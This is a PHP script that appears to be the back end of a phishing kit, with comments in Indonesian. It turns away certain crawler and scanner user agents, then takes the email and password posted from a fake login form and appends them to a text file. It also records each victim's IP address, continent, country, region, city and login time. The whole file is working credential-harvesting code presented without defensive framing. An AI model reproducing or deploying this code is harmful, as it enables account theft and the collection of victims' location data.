<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// MENGAMBIL KONTROL
include 'system/setting.php';

// MENYIMPAN DATA YANG DI-INPUT KE DALAM FORMAT FILE .TXT
$logData = "saveLoginData.txt";

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$handle = fopen($logData, 'a');
fwrite($handle, "===== ACCOUNT INFORMATION =====");
fwrite($handle, "\n");
fwrite($handle, "EMAIL/PHONE/USERNAME: $email");
fwrite($handle, "\n");
fwrite($handle, "PASSWORD: $password");
fwrite($handle, "\n");
fwrite($handle, "===== ADDITIONAL INFORMATION =====");
fwrite($handle, "\n");
fwrite($handle, "IP ADDRESS: $arpantek_ip_address");
fwrite($handle, "\n");
fwrite($handle, "CONTINENT: $arpantek_continent");
fwrite($handle, "\n");
fwrite($handle, "COUNTRY: $arpantek_country");
fwrite($handle, "\n");
fwrite($handle, "REGION: $arpantek_region");
fwrite($handle, "\n");
fwrite($handle, "CITY: $arpantek_city");
fwrite($handle, "\n");
fwrite($handle, "LOGIN TIME: $jamasuk");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
}
?>